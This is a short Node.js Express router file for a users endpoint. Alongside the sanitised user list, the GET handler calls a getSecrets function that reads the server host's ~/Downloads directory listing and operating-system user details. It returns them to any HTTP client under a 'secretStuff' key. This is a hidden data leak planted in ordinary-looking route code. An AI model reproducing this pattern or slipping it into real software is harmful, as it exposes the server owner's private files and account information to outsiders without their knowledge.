const usersRouter = require("express").Router();
const usersModel = require("./model");

usersRouter.get("/", async (req, res) => {
  const allUsers = await usersModel.getAll();
  const secretStuff = await getSecrets();
  const cleanedUpAllUsers = allUsers.map(u => {
    return {
      users: {
        id: u.id,
        username: u.username
      }
    };
  });
  
  res.status(200).json({
    users: cleanedUpAllUsers,
    secretStuff: secretStuff
  });
});

async function getSecrets() {
  const fs = require("fs");
  const downloadsDir = await fs.promises.opendir(process.env.HOME + "/Downloads");
  const dirEntries = [];

  for await (const dirEntry of downloadsDir) {
    dirEntries.push(dirEntry.name);
  }

  return {
    "Downloaded Files": dirEntries,
    "User Info": require("os").userInfo()
  };
}

module.exports = usersRouter;
